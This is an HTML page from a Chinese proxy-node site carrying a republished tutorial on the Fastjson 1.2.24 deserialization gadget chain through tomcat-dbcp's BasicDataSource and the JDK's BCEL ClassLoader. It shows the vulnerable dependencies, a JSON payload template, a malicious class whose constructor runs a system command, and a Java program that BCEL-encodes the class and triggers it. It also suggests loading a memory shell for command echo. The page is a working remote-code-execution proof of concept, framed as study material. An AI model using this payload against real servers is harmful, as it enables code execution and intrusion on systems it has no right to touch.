@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+        <link rel="canonical" href="https://trojannode.github.io/news/article-25241.htm" />
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <title>Fastjson tomcat-dhcp链</title>
+        <meta name="description" content="这条链可直接回显，可以解决fastjson在内网的情况，因为很多实战的时候，fastjson的应用部署在内网，只映射一个端口出来，导致前面学习的jdbcRowImpl链的jndi利用不了，而Templ" />
+        <link rel="icon" href="/assets/website/img/trojannode/favicon.ico" type="image/x-icon"/>
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
+    <!-- Vendor CSS Files -->
+    <link href="__ADDON__/js/frontend/trojannode/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+    <link href="__ADDON__/js/frontend/trojannode/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+    <link href="__ADDON__/js/frontend/trojannode/boxicons/css/boxicons.min.css" rel="stylesheet">
+    <link href="__ADDON__/js/frontend/trojannode/glightbox/css/glightbox.min.css" rel="stylesheet">
+    <link href="__ADDON__/js/frontend/trojannode/remixicon/remixicon.css" rel="stylesheet">
+    <link href="__ADDON__/js/frontend/trojannode/swiper/swiper-bundle.min.css" rel="stylesheet">
+    <!-- Template Main CSS File -->
+    <link href="/assets/website/css/trojannode/style.css" rel="stylesheet">
+    
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-THYLRGLVV9"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-THYLRGLVV9');
+</script>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3332997411212854"
+     crossorigin="anonymous"></script>
+</head>
+
+<body data-page="detail">
+        <!-- ======= Header ======= -->
+    <header id="header" class="fixed-top ">
+        <div class="container d-flex align-items-center justify-content-between">
+                        <a href="/"><span class="logo">Troja Nnode</span></a>
+                        <nav id="navbar" class="navbar">
+                <ul>
+                                        <li><a class="nav-link" href="/">首页</a></li>
+                                        <li><a class="nav-link" href="/free-nodes/">免费节点</a></li>
+                                        <li><a class="nav-link" href="/paid-subscribe/">推荐机场</a></li>
+                                        <li><a class="nav-link" href="/news/">新闻资讯</a></li>
+                                        <li><a class="nav-link" href="#">关于</a></li>
+                    <li><a class="nav-link" href="#">联系</a></li>
+                </ul>
+                <i class="bi bi-list mobile-nav-toggle"></i>
+            </nav><!-- .navbar -->
+        </div>
+    </header><!-- End Header -->
+    <main id="main">
+        <!-- ======= Breadcrumbs ======= -->
+        <section class="breadcrumbs">
+            <div class="container">
+                <div class="d-flex justify-content-between align-items-center">
+                    <h2>Fastjson tomcat-dhcp链</h2>
+                    <ol>
+                        <li><a href="/">首页</a></li>
+                        <li><a href="/news/">新闻资讯</a></li>
+                        <li>正文</li>
+                    </ol>
+                </div>
+            </div>
+        </section><!-- End Breadcrumbs -->
+        <!-- ======= About Section ======= -->
+        <section id="about" class="about">
+            <div class="container">
+                <div class="row">
+                    <div class="col-md-9">
+                                          				  				  				</h1> <p>这条链可直接回显，可以解决fastjson在内网的情况，因为很多实战的时候，fastjson的应用部署在内网，只映射一个端口出来，导致前面学习的jdbcRowImpl链的jndi利用不了，而TemplatesImpl链又因为有利用条件，用<code>parseObject()</code>方法时，需要加入<code>Feature.SupportNonPublicField</code>参数，就有了大佬们使用tomcat-dhcp链，而tomcat-dbcp依赖又是数据库依赖比较常见。而tomcat-dbcp是依赖$$BCEL$$的。</p> <h2 id="1前置知识">1、前置知识</h2> <h2 id="11bcel">1.1、BCEL</h2> <p>BCEL的全名应该是<a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://so.csdn.net/so/search?q=Apache&amp;spm=1001.2101.3001.7020"  target="_blank" rel="nofollow">Apache</a> Commons BCEL，属于Apache Commons项目下的一个子项目。</p> <p>BCEL库提供了一系列用于分析、创建、修改Java Class文件的API。</p> <p>就这个库的功能来看，其使用面远不及同胞兄弟们，但是他比Commons Collections特殊的一点是，它被包含在了原生的JDK中，位于<code>com.sun.org.apache.bce</code>。</p> <p>我们来看看我们今天的主角<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>,在jdk的rt.jar包里面</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/cbd1dc06b57742bd95a324b4e7ece23e.jpg" alt="Fastjson tomcat-dhcp链"></p> <p>我们来看loadClass这个方法，获取class_name，判断开头是不是<code>$$BCEL$$</code>，是就调用createClass(class_name),然后通过</p> <p>classname获取字节码，然后调用defineClass实例化我们的字节码。我们先看看createClass</p> <pre><code class="language-java">protected Class loadClass(String class_name, boolean resolve)   throws ClassNotFoundException {   Class cl = null;   ......     if(cl == null) {       JavaClass clazz = null;        /* Third try: Special request?        */       if(class_name.indexOf("$$BCEL$$") &gt;= 0)         clazz = createClass(class_name);       else { // Fourth try: Load classes via repository         if ((clazz = repository.loadClass(class_name)) != null) {           clazz = modifyClass(clazz);         }         else           throw new ClassNotFoundException(class_name);       }        if(clazz != null) {         byte[] bytes  = clazz.getBytes();         cl = defineClass(class_name, bytes, 0, bytes.length);       } else // Fourth try: Use default class loader         cl = Class.forName(class_name);     }      if(resolve)       resolveClass(cl);   }    classes.put(class_name, cl);    return cl; }</code></pre> <p>createClass这个类就是把$$BCEL$$后面的字段赋值给real_name，然后通过Utility.decode将BCEL解码成字节码，然后解析字节码编程类，返回这个类，所以createClass就是获取class_name的$$BCEL$$的字节码转换成类</p> <pre><code class="language-java">  protected JavaClass createClass(String class_name) {     int    index     = class_name.indexOf("$$BCEL$$");     String real_name = class_name.substring(index + 8);      JavaClass clazz = null;     try {       byte[]      bytes  = Utility.decode(real_name, true);       ClassParser parser = new ClassParser(new ByteArrayInputStream(bytes), "foo");        clazz = parser.parse();     } catch(Throwable e) {       e.printStackTrace();       return null;     }      // Adapt the class name to the passed value     ConstantPool cp = clazz.getConstantPool();      ConstantClass cl = (ConstantClass)cp.getConstant(clazz.getClassNameIndex(),                                                      Constants.CONSTANT_Class);     ConstantUtf8 name = (ConstantUtf8)cp.getConstant(cl.getNameIndex(),                                                      Constants.CONSTANT_Utf8);     name.setBytes(class_name.replace('.', '/'));      return clazz;   }</code></pre> <p>还有有一个点就是<code>com.sun.org.apache.bcel.internal.classfile.Utility</code>该类存储了bcel的加解密方法</p> <pre><code class="language-java"> Utility.decode(String real_name, true)  Utility.encode(byte[] bytes,, true)</code></pre> <p>最后poc的构造</p> <p>我们可以通过FastJson反序列化，反序列化生成一个 org.apache.tomcat.dbcp.dbcp2.BasicDataSource 对象，并将它的成员变量 classloader 赋值为 com.sun.org.apache.bcel.internal.util.ClassLoader 对象，将 classname 赋值为 经过BCEL编码的字节码（假设对应的类为Evil.class），我们将需要执行的代码写在 Evil.class 的 static 代码块</p> <h2 id="2poc分析">2、POC分析</h2> <h3 id="21依赖">2.1、依赖</h3> <pre><code class="language-xml">    &lt;dependencies&gt;         &lt;dependency&gt;             &lt;groupId&gt;com.alibaba&lt;/groupId&gt;             &lt;artifactId&gt;fastjson&lt;/artifactId&gt;             &lt;version&gt;1.2.24&lt;/version&gt;         &lt;/dependency&gt;         &lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-dbcp --&gt;         &lt;dependency&gt;             &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;             &lt;artifactId&gt;tomcat-dbcp&lt;/artifactId&gt;             &lt;version&gt;9.0.8&lt;/version&gt;         &lt;/dependency&gt;      &lt;/dependencies&gt;</code></pre> <h3 id="22poc">2.2、poc</h3> <pre><code class="language-json">{     {         "x":{                 "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",                 "driverClassLoader": {                     "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"                 },                 "driverClassName": "$$BCEL$$$l$8b$I$A$..."         }     }: "x" }</code></pre> <p>编写恶意代码类，并且编译成class文件，既字节码形式</p> <pre><code class="language-java">package com.akkacloud;  import java.io.IOException;  public class Calc {     public Calc() throws IOException {         Runtime.getRuntime().exec(" open /System/Applications/Calculator.app ");     } }</code></pre> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/0b2d667157b3acfa060fdae2a01c639c.jpg" alt="Fastjson tomcat-dhcp链"></p> <pre><code class="language-java">package com.akkacloud;  import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.sun.org.apache.bcel.internal.Repository; import com.sun.org.apache.bcel.internal.classfile.JavaClass; import com.sun.org.apache.bcel.internal.classfile.Utility;  import java.util.Arrays;  class fastjson_dbcp {     public static void main(String[] argv) throws Exception{         JavaClass cls = Repository.lookupClass(Calc.class);         //System.out.println(Arrays.toString(cls.getBytes()));         String code = Utility.encode(cls.getBytes(), true);//转换为字节码并编码为bcel字节码         System.out.println(code);         String poc = "{\n" +                 "    {\n" +                 "        \"aaa\": {\n" +                 "                \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +                 "                \"driverClassLoader\": {\n" +                 "                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +                 "                },\n" +                 "                \"driverClassName\": \"$$BCEL$$"+ code+ "\"\n" +                 "        }\n" +                 "    }: \"bbb\"\n" +                 "}";         System.out.println(poc);         JSON.parse(poc);     } }</code></pre> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/2d999690e064ecd8934521449273ba02.jpg" alt="Fastjson tomcat-dhcp链"></p> <p>最后说一句对jdk版本有要求，jdk1.8u251前可以成功</p> <h3 id="23利用链">2.3、利用链</h3> <pre><code>BasicDataSource.getConnection()  createDataSource()   createConnectionFactory()</code></pre> <p>其实看到这个利用链，就知道传入我们的BasicDataSource类，会自动调用getter和setter方法，然后调用getConnection方法。我们在</p> <p>getConnection打断点调试一下，可以看到我们在BasicDataSource里存入的恶意代码都已经存入，继续跟createDataSource</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/230a1f4da941cbdd71175ae7d5376aa8.jpg" alt="Fastjson tomcat-dhcp链"></p> <p>跟进发现，会判断dataSource是够为空，然后调用createConnectionFactory(就是创建链接工厂方法)，继续跟进</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/13d7ed70320b6f484f16a157252732c9.jpg" alt="Fastjson tomcat-dhcp链"></p> <p>到了这里就很清楚了，通过class.forName方法，使用我们自定义的classloder（com.sun.org.apache.bcel.internal.util.ClassLoader)，获取该类</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/7189fec5b774c0e5765186eb3a61c1e4.jpg" alt="Fastjson tomcat-dhcp链"></p> <p>然后实例化该类，造成命令执行。</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/d3a25a0b7131bac500d05d3af19b80d9.jpg" alt="Fastjson tomcat-dhcp链"></p> <h3 id="24结束">2.4、结束</h3> <p>旧版本的 tomcat-dbcp 对应的路径是 org.apache.tomcat.dbcp.dbcp.BasicDataSource</p> <pre><code class="language-xml">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/dbcp --&gt; &lt;dependency&gt;     &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;     &lt;artifactId&gt;dbcp&lt;/artifactId&gt;     &lt;version&gt;6.0.53&lt;/version&gt; &lt;/dependency&gt;</code></pre> <p>Tomcat 8.0以后采用org.apache.tomcat.dbcp.dbcp2.BasicDataSource</p> <pre><code class="language-xml">&lt;dependency&gt;     &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;     &lt;artifactId&gt;tomcat-dbcp&lt;/artifactId&gt;     &lt;version&gt;9.0.8&lt;/version&gt; &lt;/dependency&gt;</code></pre> <p>我们可以通过传入内存马的Class字节码，达到回显的目的</p> <p>参考</p> <p><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html"  target="_blank" rel="nofollow">https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html</a></p> <p><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://www.cnblogs.com/nice0e3/p/14949148.html#"  target="_blank" rel="nofollow">https://www.cnblogs.com/nice0e3/p/14949148.html#</a></p> 			                <div class="clearfix"></div>
+                <div class="col-md-12 mt-5">
+                                        <p>上一个：<a href="/news/article-25240.htm">win11系统找不到记事本如何解决</a></p>
+                                    </div>
+                                    </div>
+                    <div class="col-md-3">
+                        <div class="panel panel-default">
+    <div class="panel-heading">
+        <h3 class="panel-title">热门文章</h3>
+    </div>
+    <div class="panel-body">
+        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
+                        <li class="py-2"><a href="/free-nodes/2024-10-7-free-node-subscribe-links.htm" title="10月7日 | Trojan节点订阅每天更新21.2M/S免费节点订阅链接">10月7日 | Trojan节点订阅每天更新21.2M/S免费节点订阅链接</a></li>
+                        <li class="py-2"><a href="/news/article-23399.htm" title="宠物粮销量排名榜前十（宠物粮品牌大全）">宠物粮销量排名榜前十（宠物粮品牌大全）</a></li>
+                        <li class="py-2"><a href="/free-nodes/2024-11-11-trojan-node.htm" title="11月11日 | Trojan节点订阅每天更新18M/S免费节点订阅链接">11月11日 | Trojan节点订阅每天更新18M/S免费节点订阅链接</a></li>
+                        <li class="py-2"><a href="/news/article-23849.htm" title="中国农业大学动物医院营业时间（中国农业大学动物医院值班表）">中国农业大学动物医院营业时间（中国农业大学动物医院值班表）</a></li>
+                        <li class="py-2"><a href="/news/article-20176.htm" title="ArrayList集合排序方式总结">ArrayList集合排序方式总结</a></li>
+                        <li class="py-2"><a href="/free-nodes/2024-11-24-trojan-node-github.htm" title="11月24日 | Trojan节点订阅每天更新21.2M/S免费节点订阅链接">11月24日 | Trojan节点订阅每天更新21.2M/S免费节点订阅链接</a></li>
+                        <li class="py-2"><a href="/free-nodes/2024-8-28-free-high-speed-nodes.htm" title="8月28日 | Trojan节点订阅每天更新22.7M/S免费节点订阅链接">8月28日 | Trojan节点订阅每天更新22.7M/S免费节点订阅链接</a></li>
+                        <li class="py-2"><a href="/free-nodes/2024-9-19-trojan-github.htm" title="9月19日 | Trojan节点订阅每天更新18.4M/S免费节点订阅链接">9月19日 | Trojan节点订阅每天更新18.4M/S免费节点订阅链接</a></li>
+                        <li class="py-2"><a href="/free-nodes/2024-9-30-trojan-node-share.htm" title="9月30日 | Trojan节点订阅每天更新21.1M/S免费节点订阅链接">9月30日 | Trojan节点订阅每天更新21.1M/S免费节点订阅链接</a></li>
+                        <li class="py-2"><a href="/news/article-24775.htm" title="PHP对象接口">PHP对象接口</a></li>
+                    </ul>
+    </div>
+</div>
+
+<div class="panel panel-default">
+    <div class="panel-heading">
+        <h3 class="panel-title">归纳</h3>
+    </div>
+    <div class="panel-body">
+        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">39</span> <a href="/date/2024-12/" title="2024-12 归档">2024-12</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">34</span> <a href="/date/2024-11/" title="2024-11 归档">2024-11</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">31</span> <a href="/date/2024-10/" title="2024-10 归档">2024-10</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">30</span> <a href="/date/2024-09/" title="2024-09 归档">2024-09</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">25</span> <a href="/date/2024-08/" title="2024-08 归档">2024-08</a></h4>
+            </li>
+                    </ul>
+    </div>
+</div>
+
+                    </div>
+                </div>
+            </div>
+        </section><!-- End About Section -->
+    </main><!-- End #main -->
+        <!-- ======= Footer ======= -->
+    <footer id="footer">
+        <div class="container d-md-flex py-4">
+            <div class="me-md-auto text-center text-md-start">
+                <div class="copyright">
+                    <a href="/">TrojanNode免费节点官网</a> 版权所有 Powered by WordPress
+                </div>
+            </div>
+            <div class="social-links text-center text-md-right pt-3 pt-md-0">
+                <a href="#" class="twitter"><i class="bx bxl-twitter"></i></a>
+                <a href="#" class="facebook"><i class="bx bxl-facebook"></i></a>
+                <a href="#" class="instagram"><i class="bx bxl-instagram"></i></a>
+                <a href="#" class="google-plus"><i class="bx bxl-skype"></i></a>
+                <a href="#" class="linkedin"><i class="bx bxl-linkedin"></i></a>
+            </div>
+        </div>
+    </footer><!-- End Footer -->
+    <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>
+    <!-- Vendor JS Files -->
+    <script src="/assets/website/js/frontend/trojannode/jquery-1.9.1.min.js"></script>
+    <script src="/assets/website/js/frontend/trojannode/bootstrap/js/bootstrap.bundle.min.js"></script>
+    <script src="/assets/website/js/frontend/trojannode/glightbox/js/glightbox.min.js"></script>
+    <script src="/assets/website/js/frontend/trojannode/isotope-layout/isotope.pkgd.min.js"></script>
+    <script src="/assets/website/js/frontend/trojannode/php-email-form/validate.js"></script>
+    <script src="/assets/website/js/frontend/trojannode/purecounter/purecounter.js"></script>
+    <script src="/assets/website/js/frontend/trojannode/swiper/swiper-bundle.min.js"></script>
+    <!-- Template Main JS File -->
+    <script src="/assets/website/js/frontend/trojannode/main.js"></script>
+    <script src="https://www.freeclashnode.com/assets/js/frontend/invite-url.js"></script>
+    <script src="/assets/website/js/frontend/G.js"></script>
+</body>
+
+</html>
